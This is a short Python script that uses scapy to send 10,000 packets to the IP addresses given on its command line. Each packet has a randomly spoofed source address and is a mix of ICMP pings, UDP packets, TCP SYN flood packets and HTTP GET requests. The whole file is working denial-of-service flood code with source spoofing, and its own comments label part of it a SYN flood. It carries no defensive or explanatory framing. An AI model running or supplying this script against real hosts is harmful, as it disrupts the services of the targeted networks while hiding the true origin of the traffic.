import sys
import time
import random
from os import popen
from scapy.all import sendp, IP, Ether, ICMP, UDP, TCP, RandShort
from random import randrange
def sourceIPgen():
    # Generate a random source IP address
    return ".".join([str(randrange(1, 256)) for _ in range(4)])

def main():
    dstIPs = sys.argv[1:]
    print(dstIPs)
    interface = popen('ifconfig | awk \'/eth0/ {print $1}\'').read()
    print(repr(interface))
   
    for i in range(10000):
        # Choose a random protocol (ICMP, UDP, TCP, or HTTP)
        protocol = random.choice([ICMP, UDP, TCP,"HTTP"])

        if protocol == ICMP:
            # Craft ICMP packets (ping)
             packets = Ether()/IP(dst=dstIPs, src=sourceIPgen())/ICMP()
        elif protocol == UDP:
            # Craft UDP packets
            packets = Ether()/IP(dst=dstIPs, src=sourceIPgen())/UDP(dport=80)
        elif protocol == TCP:
            # Craft TCP packets (SYN flood)
            packets = Ether()/IP(dst=dstIPs, src=sourceIPgen())/TCP(dport=int(RandShort()), sport=int(RandShort()), flags="S")
        elif protocol == "HTTP":
            # Craft HTTP packets (HTTP request)
            packets = Ether()/IP(dst=dstIPs, src=sourceIPgen())/TCP(dport=80)/"GET / HTTP/1.1\r\nHost: example.com\r\n\r\n"
       
        print(repr(packets))
        sendp(packets, iface=interface.rstrip(), inter=0.05)

if __name__ == "__main__":
    main()
